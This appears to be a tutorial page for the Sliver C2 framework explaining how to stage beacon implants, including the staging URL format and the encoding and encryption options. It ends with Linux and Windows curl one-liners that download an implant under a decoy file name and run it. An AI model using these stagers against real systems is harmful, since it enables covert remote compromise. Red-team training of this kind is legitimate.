# This course is intended for the 1.6 version of Sliver, which is not yet published

When using Sliver during a live engagement, you’re going to need to use custom stagers, which are essentially a first binary or commandline that will retrieve and/or load Sliver into memory on your target system. Sliver can generate shellcode for your stager to execute by using the `profiles` command.

For this exercise, we will create a new beacon profile and prepare to stage it.

```asciinema
{"src": "/asciinema/create_profile.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

If you look at the generated implant, you'll notice the `ID` field has been populated. When downloading your payload from the staging server your URL needs to be in the form of:
```
https://sliver-ip/whatever.stager_file_ext?x=yourID
```

There is a lot of flexibility in the form of this URL, the conditions for successful staging are:
* The file extension needs to match the c2 profile's stager_file_ext
* There has to be a one character http url parameter
* The digits found in the ID need to match an implant ID, if your implant ID is 1234, abcd1234, 12beu34 are all valid values

To expose a payload, you need to use the `implants stage` command and specifically select the implant to leave accessible.

```asciinema
{"src": "/asciinema/stage_implant.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

At this point we can try retrieving our implant. The ID is 19778.

```asciinema
{"src": "/asciinema/implant_curl.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

Sliver staging also supports encoding or encrypting our payloads before exposing them externally using the `profile stage` command, the implant configuration remains the same but you are now able to stage different versions of it simultaneously.

```asciinema
{"src": "/asciinema/stage_compress_encrypt.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

A simple stager could look like this, for example in Linux:

```
curl http://localhost/nothingtoseehere.yml?c=1234 --output nothingtoseehere && chmod u+x nothingtoseehere &&nohup ./nothingtoseehere
```

Or on Windows:
```
curl http://172.20.10.3/test.woff?a=29178 -o t.exe && .\t.exe
```
